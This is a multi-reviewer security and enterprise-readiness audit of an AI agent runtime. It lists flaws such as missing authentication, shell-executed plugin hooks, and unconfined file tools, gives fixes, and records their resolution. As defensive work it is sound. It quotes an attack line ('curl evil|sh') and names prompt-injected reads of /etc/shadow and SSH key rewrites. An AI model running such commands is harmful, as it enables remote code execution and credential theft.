# Enterprise Readiness Review — topsport-agent

**Date**: 2026-04-17
**Commit**: `6b5f6f7` (main)
**Scope**: `src/topsport_agent/**` + `tests/**`
**Reviewers**: Codex adversarial review · Claude (blind-spot pass) · 4 parallel `team-reviewer` agents (Security / Performance / Architecture / Testing)
**Status**: Draft — pending team review

---

## 0. Executive Summary

topsport-agent is well-factored as a single-user CLI agent runtime but is **not ready for enterprise deployment** in its current form. Four Critical and twenty-seven High findings block exposure as a multi-tenant service.

The single most load-bearing observation is not security-related: **sub-agents (`spawn_agent`, Orchestrator, `/v1/plan/execute`) silently drop skills / memory / compaction / tracing**. Three independent reviewers surfaced this from different angles. Fixing it (see CR-A2) has outsized payoff because it restores capability parity between the REPL and the service.

### Summary matrix (after dedup)

| Dimension                 | Critical | High  | Medium | Low   | Total  |
| ------------------------- | -------: | ----: | -----: | ----: | -----: |
| Security                  |        3 |     8 |      3 |     3 |     17 |
| Performance               |        0 |     4 |      9 |     6 |     19 |
| Architecture              |        0 |     4 |      5 |     5 |     14 |
| Testing                   |        0 |     3 |      6 |     3 |     12 |
| Ops / Cost / Data / Rel   |        1\* |     8 |      5 |     0 |     14 |
| **Total (after merge)**   |    **4** | **27**| **28** | **17**| **76** |

\*CR-01 (HTTP trust boundary) subsumes OPS-versioning concerns.

---

## 1. Methodology

1. **Codex adversarial pass** surfaced three foundational issues (HTTP auth, file concurrency, model drift).
2. **Independent blind-spot audit** covered six operational areas the dimension reviewers don't natively target: Operational Readiness, Observability, LLM Reliability, Cost Control, Data Lifecycle, Versioning.
3. **Parallel dimension review** by four `team-reviewer` agents (Security / Performance / Architecture / Testing), each instructed to treat Codex findings as known baseline and go beyond.
4. **Consolidation** per `agent-teams/multi-reviewer-patterns` merge rules: same file:line same issue → merged with higher severity; same location different issue → co-located with cross-reference; conflicting severity → higher wins.

Raw findings: 91. After dedup: 76.

---

## 2. Critical (4) — Block deployment until fixed

### CR-01 · HTTP trust boundary does not exist

- **Locations**:
  - `src/topsport_agent/server/chat.py:59-86`
  - `src/topsport_agent/server/plan.py:64-83`
  - `src/topsport_agent/server/app.py:100-106`
- **Dimensions**: Security (SEC-C-03, SEC-H-05), Ops (OPS-M-04), Codex baseline
- **Problem**:
  1. `/v1/chat/completions` and `/v1/plan/execute` have no authentication dependency.
  2. `body.user` is used verbatim as `SessionStore` primary key — any caller can target another caller's session.
  3. Default Agent mounts `file_tools`, skills, plugins, which makes every unauthenticated request capable of driving host-FS and local-code actions.
  4. `/healthz` always returns 200 regardless of provider / plugin / session store state; load balancers treat a broken instance as healthy.
  5. `/v1/` is a string literal — no API version gating strategy.
- **Impact**: Multi-tenant session hijack; unauthenticated RCE-class surface via tool-bearing agents; failure to drain traffic away from broken instances.
- **Fix direction**:
  - Auth middleware using `hmac.compare_digest` on a signed bearer or JWT; session id must be derived (or namespaced) from the authenticated principal.
  - Expose a distinct "service agent" preset with file / plugin / skill tools disabled by default; enabling requires explicit config.
  - Split `/healthz` (liveness, always cheap) from `/readyz` (deep check: provider reachable, session store not degraded).
  - Server-side clamp on `body.max_steps`.
  - Route prefix driven by `ServerConfig.api_version`.

### CR-02 · MCP stdio transport executes arbitrary commands from JSON config

- **Location**: `src/topsport_agent/mcp/config.py:28-40`, `src/topsport_agent/mcp/client.py:92-106`
- **Dimensions**: Security (SEC-C-01)
- **Problem**: `load_mcp_config` reads any `command / args / env` and hands them to `StdioServerParameters`, which forks the subprocess on `from_config()`. There is no signature, no allowlist, no binary-location pinning.
- **Attack vector**: Write access to `~/.mcp.json`, a shared repo config, or a "marketplace" instruction is enough for RCE as the agent user.
- **Fix direction**: Operator-signed allowlist of `(name, absolute_command_path, allowed_args_pattern)`. Reject shell interpreters. Validate `command` resolves inside a configured interpreter root before `create_subprocess_exec`.

### CR-03 · Plugin hooks run via `create_subprocess_shell`

- **Location**: `src/topsport_agent/plugins/hook_runner.py:63-78, 148-163`
- **Dimensions**: Security (SEC-C-02)
- **Problem**: Every discovered plugin's `hooks/hooks.json` has its `command` field passed to `asyncio.create_subprocess_shell(...)` — full shell interpretation — on events including `SessionStart`, `PreToolUse`, `UserPromptSubmit`. `TOOL_NAME` / `SESSION_ID` are injected as env, and any future template expansion would be second-order injection.
- **Attack vector**: A typosquat plugin whose `hooks.json` contains `"command": "curl evil|sh"` gets RCE on every session start, silently.
- **Fix direction**: Require `command` to be an argv list; use `create_subprocess_exec`. Add an operator-approved plugin trust manifest — only plugins on the list load hooks.

### CR-04 · File tools have zero workspace containment and zero atomicity

- **Location**: `src/topsport_agent/tools/file_ops.py:30-35, 86-284`
- **Dimensions**: Security (SEC-H-01, SEC-M-02, SEC-M-03), Codex baseline
- **Problem**:
  1. `_ensure_absolute` checks only absolute-vs-relative; there is no workspace root.
  2. `read_text` / `write_text` / `rglob` implicitly follow symlinks.
  3. `write_file` / `edit_file` do read-modify-write without temp file + `os.replace`, without per-path locks, and with a TOCTOU between `count` and the final write.
- **Attack vector**: One prompt-injected tool call reads `/etc/shadow` or rewrites `~/.ssh/authorized_keys`; concurrent edits silently lose data; symlink escapes any future sandbox.
- **Fix direction**:
  - Mandatory `ToolContext.workspace_root`; every path must pass `Path.resolve(strict=True).is_relative_to(root)`.
  - `followlinks=False` in all recursion; `Path.resolve(strict=True)` re-check after each read.
  - Writes go to a temp file in the same directory + `os.replace`.
  - `fcntl.flock` (or a per-path `asyncio.Lock`) around `edit_file` read→check→write.
  - `edit_file` additionally carries an `expected_hash` precondition and fails on mismatch.

---

## 3. High (27) — Fix before enterprise contracts

### 3.1 Security (8)

| ID    | Location                                       | Issue                                                                          | Fix                                                                           |
| ----- | ---------------------------------------------- | ------------------------------------------------------------------------------ | ----------------------------------------------------------------------------- |
| H-S1  | `mcp/client.py:115-119`                        | `follow_redirects=True` + headers replayed to redirect target → SSRF + creds   | `follow_redirects=False`; strip `Authorization` on cross-origin               |
| H-S2  | `observability/langfuse_tracer.py:89-215`      | Tool args / outputs / LLM payload shipped verbatim to third-party              | Configurable redaction + `base_url` allowlist                                 |
| H-S3  | `server/main.py:15-26`                         | `.env` auto-loaded from CWD, no owner/perm check → silent `API_KEY` hijack     | `--env-file` only; stat owner == caller && mode ≤ 0600                        |
| H-S4  | `tools/safe_shell.py:37-49`                    | Basename-only interpreter check; `allowed_commands=None` = anything on `$PATH` | Force non-None allowlist; match by resolved absolute path                     |
| H-S5  | `plugins/manager.py:75-133`                    | `shutil.copytree` without size / symlink / name-escape limits                  | Size cap; `follow_symlinks=False`; plugin text quoted in system prompt        |
| H-S6  | `browser/client.py:88-93`, `browser/tools.py`  | `page.goto(url)` accepts any scheme / IP → `file://` + metadata SSRF           | Scheme allowlist; RFC1918 + metadata blocklist (pre + post DNS); per-session incognito |

Additional Security items rolled into CR-04 (file tools) and CR-01 (HTTP surface) above.

### 3.2 Reliability / Cost / Ops / Observability (8)

| ID    | Location                                              | Issue                                                                  | Fix                                                          |
| ----- | ----------------------------------------------------- | ---------------------------------------------------------------------- | ------------------------------------------------------------ |
| H-R1  | `llm/clients/anthropic_messages.py:73`, `openai_chat.py:66` | Streaming path explicitly does not retry; non-streaming does 3× → asymmetric behavior | Retry only while no delta has been yielded                   |
| H-R2  | *(missing feature)*                                   | No token / cost budget; `max_steps` is the only hard cap                 | `Session.token_budget`; PostStepHook raises `BudgetExceeded` |
| H-R3  | *(missing feature)*                                   | No Prometheus / OTel metrics endpoint                                  | `observability/metrics.py` + EventSubscriber                 |
| H-R4  | `engine/loop.py:66-76`, `orchestrator.py:70-79`       | Subscriber exception silently swallowed; audit-class subscribers lose alerts | `critical: bool` attribute on EventSubscriber + failure counter |
| H-R5  | `server/app.py:88-91`                                 | No graceful drain; SIGTERM cuts streaming mid-session                  | `drain_event` + 503 middleware + `wait_for(all_entry_locks)` |
| H-R6  | `server/app.py:100-102`                               | `/healthz` is a constant — load balancers can't detect broken instance  | Shallow `/healthz` + deep `/readyz`                          |
| H-R7  | *(missing feature)*                                   | No per-user / tenant quota                                             | `user_id → active_session_count` cap                         |
| H-R8  | *(missing feature)*                                   | No GDPR / 个保法 endpoint — no session export / delete                  | `DELETE /v1/sessions/{id}` + `GET /v1/sessions/{id}/export`  |

### 3.3 Performance (4)

| ID    | Location                                                                              | Issue                                                                                              | Fix                                                           |
| ----- | ------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- | ------------------------------------------------------------- |
| H-P1  | `memory/injector.py:30`, `skills/injector.py:47-55`, `skills/registry.py:34`          | Memory + Skill injectors read disk and render catalogs every step                                  | mtime-keyed cache + LoadedSkill LRU + memoized catalog        |
| H-P2  | `mcp/tool_bridge.py:23-33`, `browser/tools.py:22`, `engine/loop.py:78-90`             | Every step re-wraps ToolSpec / rebuilds closures, even for static sources                          | `ToolSource.is_dynamic` flag + snapshot cache                 |
| H-P3  | `plugins/manager.py:75-104`                                                           | Every new session pays full plugin tempdir copy → seconds of cold start + `/tmp` fills **(cross-ref H-S5)** | Process-level `PluginManager` singleton; or prefix-based rewrites |
| H-P4  | `engine/compaction/token_counter.py:10-19`                                            | `after_step` stringifies full session history per step                                             | Per-Message length memoization                                |

### 3.4 Architecture (4)

| ID    | Location                                                                            | Issue                                                                                                       | Direction                                                           |
| ----- | ----------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- |
| H-A1  | `agent/base.py:143-214`                                                             | `Agent.from_config` is a god factory; capability ordering hardcoded; `enable_*` booleans grow monotonically | `CapabilityModule` list with `depends_on`                           |
| H-A2  | `agent/base.py:263-345` + `engine/orchestrator.py:107-155` + `server/plan.py:71-77` | Sub-agents silently drop skills / memory / compaction / tracing (merges ARCH-H-02 + ARCH-M-03 + ARCH-M-06)  | Orchestrator + spawn both build full `Agent`s via `Agent.spawn_child` |
| H-A3  | `agent/browser.py:86-94`                                                            | `_has_browser_tools` reads `engine._tool_sources` private state                                             | `Agent.from_config` returns a capabilities report                   |
| H-A4  | `engine/planner.py:75-102`                                                          | Planner depends on tool-call ABI; Gemini / JSON-mode break silently                                         | `StructuredOutput` capability Protocol                              |

### 3.5 Testing (3)

| ID    | Invariant / feature                                 | Current coverage            | Suggested test                                                           |
| ----- | --------------------------------------------------- | --------------------------- | ------------------------------------------------------------------------ |
| H-T1  | Per-step tool snapshot reflects source changes      | only count-based assertion  | 3-step engine, `CountingSource` returns `[a]` then `[b]` — assert provider sees `b` |
| H-T2  | `Engine.cancel()` via FIRST_COMPLETED, not polling  | 1 s budget test — loose     | never-resolve provider; cancel after 10 ms; assert completion < 50 ms    |
| H-T3  | `SessionStore` TTL eviction                         | only LRU is tested          | `ttl=1`, monkeypatch time 2s, assert evict + agent close                 |

---

## 4. Medium (28) — Address post-GA

Grouped by theme. Full file:line in the individual reviewer reports.

- **Security-M**: BlobStore digest regex too permissive; MCP `inputSchema` unvalidated (prompt injection + server-name collision); long-lived API keys with no rotation scope.
- **Performance-M**: serial `_emit` await blocks engine (**cross-ref H-R4**); Anthropic/OpenAI adapters re-serialize tool outputs every call; `auto_compact` `str()` on large dicts; LoopDetector uses md5+json.dumps; SessionStore LRU is O(N) scan; PromptBuilder instance recreated per step; ToolExecutor / LoopDetector double-wrap risk; Browser `get_text` does 8 sequential IPC calls; `aria_snapshot` payload unbounded.
- **Architecture-M**: LLM 4-layer split (`provider.py` vs `providers/` vs `clients/` vs `adapters/`) over-decomposed; missing `PreStepHook` and `ToolInterceptor` seams; `CompactionHook.provider: Any` erases Protocol; `Event.session_id` overloaded to carry `plan_id`; CLI and server duplicate provider construction.
- **Ops / Cost / Data / Ver-M**: config source is env-only, no secrets-manager hook; `/v1` literal; plan audit not persisted; `ChatCompletionUsage()` returned empty despite engine having real usage; no PII redaction hook; `Message.extra` and `Event.payload` are unschematized `dict[str, Any]` → cross-process unstable; `LLMResponse.response_metadata` has no `schema_version`; no JSON codec for `Message` / `Event` / `ToolCall`.
- **Testing-M**: streaming "no `done` chunk" fallback untested; MCP two-level error model (`isError=True`) untested; `_emit` exception with exploder in middle position untested; Plan SSE pairing (`start`/`end`) not asserted; 5 s `asyncio.sleep` leak; RUN_END after provider exception not asserted.

## 5. Low (17)

`Cancelled` underdocumented · `provider` / `providers` / `provider_options` naming collision · `Message.extra` dual-purpose · `PluginManager._hook_runner._hooks` private access · compaction module public surface unclear · `/healthz` probe rate · SSE error frames echo raw `str(exc)` · memory frontmatter `created_at` forgeable · `asyncio.sleep` synchronization · `SessionStore._entries` accessed in tests · shared `cancel_event` fixture missing · `CapturingProvider` / `ScriptedProvider` duplicated across 5 test files · misc micro-optimizations.

---

## 6. Recommended implementation sequence

### Phase 0 — Do not expose until done (P0 — blocker)

Ship target: CR-01..04 resolved. Until then, **do not bind the HTTP server to `0.0.0.0`** and do not distribute an MCP config that isn't operator-signed.

### Phase 1 — Basic compliance & observability (≈ 2-3 weeks)

Ship target: H-S1, H-S2, H-S3, H-S6, H-R1, H-R2, H-R3, H-R4, H-R8.

Rationale: without these, the service cannot meet standard enterprise SOC2 / ISO basic controls nor support SLO-driven on-call.

### Phase 2 — Extensibility & capability parity (≈ 3-4 weeks)

Ship target: H-A1, H-A2, H-A4.

Rationale: `H-A2` unlocks `/v1/plan/execute` feature parity with `/v1/chat/completions`, which is the single biggest external surprise today. `H-A4` is a prerequisite for adding non-Anthropic / non-OpenAI providers.

### Phase 3 — Production stability (ongoing)

Ship target: H-P1..4, H-R5, H-R6, H-T1..3, and the higher-impact Medium items (`_emit` serial block, SessionStore LRU, streaming fallback tests, MCP `isError` tests).

### Phase 4 — Governance (continuous)

Data lifecycle APIs, schema versioning, config-source extensibility, metrics coverage.

---

## 7. Two cross-cutting observations worth re-stating

1. **The Agent abstraction's biggest risk is not security — it's capability parity.** Codex, the Architecture reviewer, and the Ops blind-spot pass independently discovered that sub-agents (`spawn_agent`, Orchestrator, `/v1/plan/execute`) all bypass the Agent layer and run bare Engines. In production this manifests as traces missing span trees, `save_memory` silently dropping in sub-agents, and compaction never running for long Plan steps. `H-A2` should precede most perf work.
2. **"safe" in the name is a pitfall.** `tools/safe_shell.py` has known bypasses and a default that allows anything on `$PATH`. Downstream code treats the "safe" label as audited. Either harden it to live up to the name or rename it (`constrained_shell` / `untrusted_shell`) in Phase 0.

---

## 8. Deliverables tracking

Issues and PRs referencing this document should tag `[review-2026-04-17]` so progress is traceable. Mark each finding as:

- `resolved` with PR link, OR
- `accepted-risk` with operator rationale, OR
- `deferred` with target phase.

Until all Critical items are `resolved`, the service MUST NOT be exposed on a network that is not fully operator-controlled.

### Status (2026-04-17, post-Phase-0)

| Finding | Status     | Commit     | Notes                                                                                     |
| ------- | ---------- | ---------- | ----------------------------------------------------------------------------------------- |
| CR-01   | `resolved` | `b33d1e1`  | `AuthConfig` + principal namespacing + secure-by-default + `/readyz` + `max_plan_steps`   |
| CR-02   | `resolved` | `93635e1`  | `MCPSecurityPolicy` + shell-interpreter basename block + allowlist `(name, cmd, prefix)`  |
| CR-03   | `resolved` | `7a1ca81`  | `argv: list[str]` + `create_subprocess_exec` + `PluginSecurityPolicy`; shell-meta regression lock |
| CR-04   | `resolved` | `df3f443`  | `ToolContext.workspace_root` + symlink rejection + `os.replace` atomic write + edit lock  |

Phase 0 complete. The service is now safe to run behind an operator-controlled ingress with a bearer token. Phase 1 (H-S1..6, H-R1..8) begins next.
